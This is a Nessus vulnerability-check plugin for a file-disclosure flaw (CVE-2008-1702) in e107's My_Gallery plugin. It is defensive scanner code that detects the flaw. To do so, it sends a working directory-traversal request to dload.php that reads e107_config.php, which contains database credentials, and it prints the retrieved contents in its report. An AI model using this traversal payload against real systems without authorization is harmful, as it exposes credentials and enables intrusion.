#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31650);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-1702");
  script_bugtraq_id(28440);
  script_xref(name:"milw0rm", value:"5308");
  script_xref(name:"OSVDB", value:"43713");
  script_xref(name:"Secunia", value:"29493");

  script_name(english:"my_gallery Plugin for e107 dload.php file Parameter Arbitrary File PHP Source Disclosure");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an information disclosure issue." );
 script_set_attribute(attribute:"description", value:
"The version of My_Gallery, a third-party photo gallery plugin for
e107, installed on the remote host allows an unauthenticated attacker
to download arbitrary files from the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-03/0373.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to read e107's config file.
  file = "../../e107_config.php";

  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/e107_plugins/my_gallery/dload.php?",
      "file=", file
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we could get the file.
  if (
    "This file has been generated by the installation script." >< res ||
    "$mySQLserver" >< res
  )
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Here are the contents of e107's config file that Nessus was able to\n",
        "retrieve from the remote host :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
